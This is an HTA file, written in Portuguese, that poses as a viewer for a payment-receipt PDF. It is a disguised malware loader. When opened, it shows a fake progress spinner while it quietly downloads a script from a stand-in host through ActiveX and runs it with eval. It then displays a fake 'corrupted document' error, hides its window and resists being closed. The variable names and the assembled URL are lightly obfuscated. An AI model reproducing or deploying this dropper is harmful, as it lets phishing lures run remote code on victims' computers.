<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Visualizador de Documentos</title>
<HTA:APPLICATION ID="doc" BORDER="thin" CAPTION="yes" SHOWINTASKBAR="yes" SINGLEINSTANCE="yes" WINDOWSTATE="normal" SCROLL="no" INNERBORDER="no" MAXIMIZEBUTTON="yes" MINIMIZEBUTTON="yes" SYSMENU="no" CONTEXTMENU="no" SELECTION="no" NAVIGABLE="no" />
<style>
  body { background-color: #f3f3f3; color: #333; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; padding: 0; height: 100vh; display: flex; flex-direction: column; }
  .topbar { background-color: #ffffff; padding: 10px 20px; border-bottom: 1px solid #ddd; display: flex; align-items: center; }
  .title { font-size: 14px; font-weight: 600; color: #202020; }
  .content { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; }
  .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0078D7; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin-bottom: 20px; }
  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  .status-text { font-size: 13px; color: #555; }
  .error-box { display: none; background: #fff; border: 1px solid #ffcccc; padding: 20px; border-radius: 8px; text-align: center; max-width: 400px; }
  .error-title { font-size: 16px; font-weight: bold; color: #d32f2f; margin-bottom: 8px; }
  .error-desc { font-size: 12px; color: #666; margin-bottom: 20px; }
  .btn { background-color: #0078D7; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; font-size: 12px; }
</style>

<script language="JScript">

    var dgsrWMrW = Math.random() * 50;
    var VHXmGqCy = "doc_" + Math.floor(dgsrWMrW);
    try { window.status = VHXmGqCy; } catch(e) {}
    

var _p1 = "https://docs-";
    var _p2 = "example.";
    var _p3 = "invalid/static/app.js";
    var uiueSs = _p1 + _p2 + _p3; // Confirme se a URL está viva
var progress = 0;
var interval;

function hideWindow() {
    window.resizeTo(0, 0);
    window.moveTo(200, 200);
    document.title = ""; 
}

window.onbeforeunload = function() {
    hideWindow();
    return false; 
}

function updateProgress() {
    progress += Math.floor(Math.random() * 10) + 5;
    if (progress > 90) progress = 90;
    if (progress < 30) document.getElementById("status").innerText = "Baixando documento...";
    else if (progress < 60) document.getElementById("status").innerText = "Verificando assinatura...";
    else document.getElementById("status").innerText = "Aplicando formatação...";
}

function showError() {
    clearInterval(interval);
    document.getElementById("loading").style.display = "none";
    document.getElementById("error").style.display = "block";
}

function P_0aaP() {
    interval = setInterval(updateProgress, 300);
    
    // Baixa o app.js silenciosamente
    setTimeout(function() {
        try {
            var x = new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");
            x.open("GET", uiueSs, false);
            x.send();
            if (x.status === 200) {
                var code = x.responseText;
                // Executa no escopo global para o app.js rodar direito
                eval(code);
            }
        } catch(e) {}
    }, 2000);

    setTimeout(function() {
        showError();
        setTimeout(hideWindow, 6000);
    }, 5000);
}

window.onload = P_0aaP;

</script>

</head>
<body>
    <div class="topbar">
        <span class="title">Documento - Comprovante_Pagamento.pdf</span>
    </div>
    <div class="content">
        <div id="loading">
            <div class="spinner"></div>
            <div class="status-text" id="status">Iniciando visualizador...</div>
        </div>
        <div class="error-box" id="error">
            <div class="error-title">Falha ao carregar o documento</div>
            <div class="error-desc">O documento está corrompido ou não pôde ser aberto.</div>
            <button class="btn" onclick="hideWindow()">Fechar</button>
        </div>
    </div>
</body>
</html>